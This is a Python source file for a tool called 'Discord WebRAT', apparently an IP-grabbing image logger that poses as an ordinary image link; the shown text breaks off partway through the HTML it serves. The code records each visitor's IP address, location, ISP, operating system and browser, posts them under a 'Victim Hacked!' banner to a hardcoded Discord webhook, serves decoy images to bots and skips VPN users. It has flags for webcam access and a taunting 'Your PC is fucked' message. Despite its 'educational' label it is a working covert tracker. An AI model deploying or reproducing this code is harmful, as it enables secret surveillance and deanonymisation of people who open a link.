import traceback
import requests
import base64
import httpagentparser
from http.server import BaseHTTPRequestHandler
from urllib import parse
from cachetools import TTLCache
import re
import logging
import json

__app__ = "Discord WebRAT"
__description__ = "Web-based RAT concept for educational purposes, logs data and simulates control via Discord webhook"
__version__ = "v1.0"
__author__ = "Grok & DeKrypt"

# Настройка логирования
logging.basicConfig(
    filename='webrat.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Кэш для IP-запросов
ip_cache = TTLCache(maxsize=1000, ttl=3600)

config = {
    "webhook": "https://discord.com/api/webhooks/1388600720617377903/J60zZzLcngRQDM1THrAzKy-E3Axt5m9L2J4gPWb6oKC-LMXIzWmpKW0nuCRvPCaVBwr_",  # Замени на свой вебхук
    "image": "https://i.imgur.com/placeholder.jpg",  # Фейковая картинка
    "imageArgument": True,
    "username": "WebRAT Logger",
    "color": 0xFF0000,  # Красный для эпичности
    "crashBrowser": False,  # Симуляция краша
    "accurateLocation": False,  # Точная геолокация (требует разрешения)
    "webcamAccess": True,  # Пытаться получить доступ к камере
    "mouseControl": True,  # Симуляция управления мышкой
    "lockScreen": False,  # Фейковая блокировка экрана
    "message": {
        "doMessage": True,
        "message": "Your PC is fucked by WebRAT! Contact us at github.com/dekrypted",
        "richMessage": True
    },
    "vpnCheck": 1,  # 0 = Off, 1 = No ping, 2 = No alert
    "antiBot": 2,  # 0 = Off, 1 = No ping (possible bot), 2 = No ping (sure bot), 3 = No alert (possible), 4 = No alert (sure)
}

blacklisted_ips = ("27.", "104.", "143.", "164.")

def is_valid_url(url):
    """Валидация URL"""
    regex = re.compile(
        r'^https?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'
        r'localhost|'
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def bot_check(ip, useragent):
    """Проверка на ботов"""
    if ip.startswith(("34.", "35.")):
        return "Discord"
    if useragent and any(bot in useragent.lower() for bot in ["telegrambot", "bot", "crawler", "spider"]):
        return "Generic Bot"
    return False

def report_error(error):
    """Отправка ошибок в Discord"""
    logging.error(f"Error: {error}")
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "WebRAT - Error",
                "color": config["color"],
                "description": f"Shit hit the fan!\n```\n{error}\n```",
            }]
        })
    except Exception as e:
        logging.error(f"Webhook error: {e}")

def get_ip_info(ip):
    """Получение инфы об IP с кэшем"""
    if ip in ip_cache:
        logging.info(f"Cache hit for IP: {ip}")
        return ip_cache[ip]
    
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        response.raise_for_status()
        data = response.json()
        ip_cache[ip] = data
        logging.info(f"Fetched IP info for {ip}")
        return data
    except requests.RequestException as e:
        logging.error(f"IP API failed: {e}")
        return {}

def make_report(ip, useragent=None, coords=None, endpoint="N/A", url=False, webcam_data=None):
    """Создание отчёта для Discord"""
    if ip.startswith(blacklisted_ips):
        logging.info(f"Blocked IP: {ip}")
        return

    bot = bot_check(ip, useragent)
    if bot and config["antiBot"] in (3, 4):
        logging.info(f"Bot detected: {bot}, skipping alert")
        return

    ping = "@everyone" if not bot or config["antiBot"] < 2 else ""

    info = get_ip_info(ip)
    if not info:
        report_error("Failed to fetch IP info")
        return

    if info.get("proxy") and config["vpnCheck"] == 2:
        logging.info(f"VPN detected for IP: {ip}, skipping alert")
        return
    if info.get("proxy") and config["vpnCheck"] == 1:
        ping = ""

    if info.get("hosting") and config["antiBot"] in (3, 4):
        if not info.get("proxy"):
            logging.info(f"Hosting detected for IP: {ip}, skipping alert")
            return
    if info.get("hosting") and config["antiBot"] in (1, 2):
        ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "WebRAT - Victim Hacked!",
            "color": config["color"],
            "description": f"""**Motherfucker got caught!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip or 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{f"{info.get('lat', 'Unknown')}, {info.get('lon', 'Unknown')}" if not coords else coords.replace(',', ', ')}`
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'False')}`
> **Bot:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
> **Webcam Access:** `{webcam_data or 'Not attempted'}`

**User Agent:**
```
{useragent or 'Unknown'}
```""",
        }]
    }

    if url and is_valid_url(url):
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(config["webhook"], json=embed, headers={"User-Agent": "WebRAT/1.0"})
        logging.info(f"Sent report for IP: {ip}")
    except requests.RequestException as e:
        report_error(f"Webhook failed: {e}")

    return info

class WebRATAPI(BaseHTTPRequestHandler):
    def handle_request(self):
        try:
            # Валидация URL изображения
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                url = base64.b64decode(dic.get("url") or dic.get("id", "").encode()).decode() if dic.get("url") or dic.get("id") else config["image"]
                if not is_valid_url(url):
                    raise ValueError("Invalid image URL")
            else:
                url = config["image"]

            ip = self.headers.get('x-forwarded-for', 'Unknown')
            useragent = self.headers.get('user-agent', 'Unknown')

            if ip.startswith(blacklisted_ips):
                logging.info(f"Blocked request from IP: {ip}")
                return

            if bot_check(ip, useragent):
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                # Фейковая картинка для ботов
                self.wfile.write(base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'))
                make_report(ip, endpoint=s.split("?")[0], url=url)
                return

            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            webcam_data = "Attempted" if config["webcamAccess"] else "Disabled"
            data = f"""<html>
<head>
    <style>
        body {{ margin: 0; padding: 0; }}
        .img {{ background-image: url('{url}'); background-position: center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}
        .lock-screen {{ display: none; position: fixed; top
